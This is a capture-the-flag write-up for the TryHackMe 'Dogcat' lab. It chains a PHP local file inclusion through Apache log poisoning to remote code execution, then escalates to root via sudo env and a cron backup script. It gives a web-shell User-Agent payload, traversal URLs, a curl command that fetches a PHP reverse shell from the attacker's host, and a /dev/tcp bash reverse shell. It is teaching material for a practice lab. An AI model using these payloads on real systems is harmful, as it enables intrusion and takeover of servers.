# Dogcat

---

Platform: Tryhackme

Difficulty: Medium

Date: 05/07/2025

Status: Rooted

---

Nmap scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/dogcat]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.87.70 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 07:41 EDT
Nmap scan report for 10.10.87.70
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: Openssh
- Port 80: http Apache httpd 2.4.38 ((Debian))

---

### Port 80:

![image](https://github.com/user-attachments/assets/caf6ea82-fd18-4e12-a002-2f026b32066f)

Just a index page with two buttons, one for viewing dog’s pictures and one for cat’s images.

Url looks little bit wierd [`http://10.10.87.70/?view=dog`](http://10.10.87.70/?view=dog) , maybe local file inclusion here, let’s try.

![image 1](https://github.com/user-attachments/assets/536ac3f1-512a-495b-8a6c-c8e7cdbb3981)

It says , sorry only dogs and cats are allowed.

When we try to provide dog.php to its url , it raise an error, Warning: include(dog.php.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24.

It means , it is already including .php extension to whatever name, we are providing.

![image 2](https://github.com/user-attachments/assets/11d94a03-8dba-4e0a-8036-df256cc4a4d4)

We can try LFI php payload to check if it’s vulnerable.

```bash
http://10.10.246.83/?view=
```
![image 3](https://github.com/user-attachments/assets/39cd90e3-8470-44f4-bb74-16234640eefb)

Now, it’s clear that it is a local file inclusion vulnerability. 

Decode that base64 string it returned to see how it all is working in the background. (How it’s processing our request and what it is adding to it.)

```bash
┌──(ghost㉿kali)-[~/tryhackme/dogcat]
└─$ echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" |base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

What this code is doing?

- When `view` is passed as a GET parameter (e.g., `/?view=dog`), the code checks if the string contains `"dog"` or `"cat"` using `containsStr()` , and if the “`ext`” parameter was provided, and if not it adds “`.php`” by default to our filename
- If it does, it **includes a file** using:
    
    ```php
    include $_GET['view'] . $ext;
    ```
    
    with `$ext` being optional and defaulting to `.php`.
    

Even though that application checking for `'dog'` or `'cat'` in the string, that is  not sanitizing the **rest of the input**. So an attacker can **bypass the intention** by:

- Using something like `/?view=dog../secretfile&ext=` (which would include `dog../secretfile`)
- Or `/?view=dog../../../../etc/passwd&ext=`

Since `"dog"` is present in the string, the check passes — and this becomes a classic **LFI with extension control** vulnerability.

Our Nmap scan above discovered that this application run on apache server, so let’s try to access it’s `access.log` file.

![image 4](https://github.com/user-attachments/assets/3698f24a-2145-4c5f-aea0-211d963e904d)


It’s a clear log poisoning vulnerability, we were able to read it’s log file. Now, we just have to exploit it to finally chain this to remote code execution.

---

### LFI to RCE

Step1: Inject PHP code into Apache logs

Send a request with custom User-Agent or another HTTP header like:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

![image 5](https://github.com/user-attachments/assets/a242b97d-3469-4835-aef4-98d8349e4170)

Step 2: Try accessing:

```bash
/?view=dog../../../../var/log/apache2/access.log&ext=&cmd=id
```

![image 6](https://github.com/user-attachments/assets/6eb94531-d833-40b4-a4f7-808fadd0a6ff)

Now, we can inject our command there.

If you wanna check and know more about this vulnerability, you can check that link below:

[LFI to RCE via Log Poisoning](https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1)

Now, we can simply upload php-reverse-shell and can execute it via browser to get remote code execution.

- I used most popular php-reverse-shell by pentest-monkey.
1. Trigger python http server from our kali machine where our php shell is stored.
    
    ```bash
    ┌──(ghost㉿kali)-[~/tryhackme/dogcat]
    └─$ ls    
    nmap.full  shell.php
                                                                                                                                           
    ┌──(ghost㉿kali)-[~/tryhackme/dogcat]
    └─$ python3 -m http.server 80                                           
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    ```
    
2. Now, download the file with curl:
    
    ```bash
    http://10.10.246.83/?view=./dog/../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php ip:80/shell.php
    ```
    
    ![image 7](https://github.com/user-attachments/assets/bc06aca7-abe4-41d4-ae9b-42cb734020f8)

    ![image 8](https://github.com/user-attachments/assets/2ea7f182-0b35-4cfd-a624-bb0e42aae6b3)

    
3. Now , just trigger that shell.php file via browser and you will gonna get reverse shell back to your machine:
    
    ```bash
    http://10.10.246.83/shell.php
    ```
    
    ![image 9](https://github.com/user-attachments/assets/baa17f74-05b8-4e76-9f5f-4443c55e6970)
    
---

### Flag 1 & 2:

```bash
$ pwd
/var/www/html
$ cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
$ cd ..
$ ls
flag2_QMW7JvaY2LvK.txt
html
$ cat flag2_QMW7JvaY2LvK.txt
THM{REDACTED}
```

---

### Getting root shell and flag3:

We can check our sudo privileges firstly:

![image 10](https://github.com/user-attachments/assets/f0059b7e-edf3-4491-b4da-47c549037ea9)


As you can see , we can use /usr/bin/env with sudo privileges, let’s use it to get root shell.

![image 11](https://github.com/user-attachments/assets/88d8b91a-2d8b-4fc8-b0e2-f47bc71313c3)

[env
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo)

```bash
$ sudo env /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag3.txt
cat flag3.txt
THM{REDACTED}
```

---

### Flag4:

In /opt/backups we can se that there is a backup script that is run regularly to generate a backup.tar file. Let’s use this to genreate another reverse shell outside of this container.

![image 12](https://github.com/user-attachments/assets/de876c09-1429-4b59-88c8-a6f50a1b20f9)

We can easily exploit, that this script is run every other minute with root privileges, by inserting some code that will generate a reverse connection to us.
To insert this code into the script, simply run this:

```bash
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/<ip>/4445 0>&1'" >> /opt/backups/backup.sh
```

And listen on your kali machine, and with in few seconds, you will get containered root shell.

![image 13](https://github.com/user-attachments/assets/de77cbea-bb5d-45f0-80e4-876f99271a76)

```bash
root@dogcat:~# ls -la
ls -la
total 40
drwx------  6 root root 4096 Apr  8  2020 .
drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
lrwxrwxrwx  1 root root    9 Mar 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr  8  2020 .cache
drwxr-xr-x  5 root root 4096 Mar 10  2020 container
-rw-r--r--  1 root root   80 Mar 10  2020 flag4.txt
drwx------  3 root root 4096 Apr  8  2020 .gnupg
drwxr-xr-x  3 root root 4096 Apr  8  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Mar 10  2020 .selected_editor
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{REDACTED}
```

That’s it for this machine. ✅
